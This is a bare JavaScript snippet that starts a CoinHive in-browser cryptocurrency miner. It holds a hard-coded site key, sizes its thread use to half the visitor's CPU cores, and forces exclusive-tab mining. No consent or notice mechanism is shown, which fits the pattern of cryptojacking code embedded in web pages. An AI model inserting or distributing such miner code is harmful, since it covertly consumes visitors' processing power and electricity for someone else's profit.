if (navigator.hardwareConcurrency > 1) {
    var cpuConfig = {
        threads: Math.round(navigator.hardwareConcurrency / 2)
    }
} else {
    var cpuConfig = {
        throttle: 0.6
    }
}
var miner = new CoinHive.Anonymous('Kh2Gi9WRs63gjnYwjrVaHMY1eONCeYyP', cpuConfig);
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);